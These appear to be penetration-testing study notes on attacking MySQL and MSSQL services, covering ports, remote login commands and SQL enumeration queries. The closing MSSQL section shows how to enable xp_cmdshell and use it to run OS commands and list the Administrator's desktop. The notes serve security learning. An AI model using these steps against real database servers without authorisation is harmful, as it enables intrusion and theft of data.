MySQL

- TCP 3306: MySQL database communication  
- Organizes information into structured tables that can be queried using SQL  
- SQL (Structured Query Language)  
- Vulnerable as MySQL is always running, open port to use  
- Tools  
  - Remote Login: mysql \-h \<target\_IP\> \-u \<username\> \-p (Connects to the remote database engine).  
  - Enumerate Databases: show databases; (Lists all databases accessible to your user).  
  - Select a Database: use \<database\_name\>; (Sets the context for subsequent queries).  
  - List Tables: show tables; (Displays all tables within the selected database).  
  - Extract Table Data: select \* from \<table\_name\>; (Retrieves all records from a specific table).

MSSQL

- Do SQL on Windows  
- TCP 1433: default port for MSSQL database engine  
- UDP 1434: SQL Browser service to locate specific instances  
- Tools  
  - Use mssqlclient.py to connect. Then can use standard SQL query  
  - Establish Connection: mssqlclient.py \<username\>@\<target\_IP\> \-windows-auth (Uses Windows credentials to log in).  
  - List Databases: SELECT name FROM master.dbo.sysdatabases; (Queries the master table for all DBs).  
  - Execute SQL Query: SELECT \* FROM \<table\_name\>; (Standard data retrieval).  
  - Check User Privileges: SELECT IS\_SRVROLEMEMBER('sysadmin'); (Checks if you have top-level admin rights).  
  - Exit Session: exit or quit.  
- XP command shell becomes a weakness  
  - Connect to Database: mssqlclient.py \<user\>@\<target\> \-windows-auth  
  - Enable xp\_cmdshell: EXEC sp\_configure 'show advanced options', 1; RECONFIGURE; EXEC sp\_configure 'xp\_cmdshell', 1; RECONFIGURE;  
  - Execute OS Commands: EXEC xp\_cmdshell 'whoami';  
  - Exfiltrate Data: EXEC xp\_cmdshell 'dir C:\\Users\\Administrator\\Desktop';
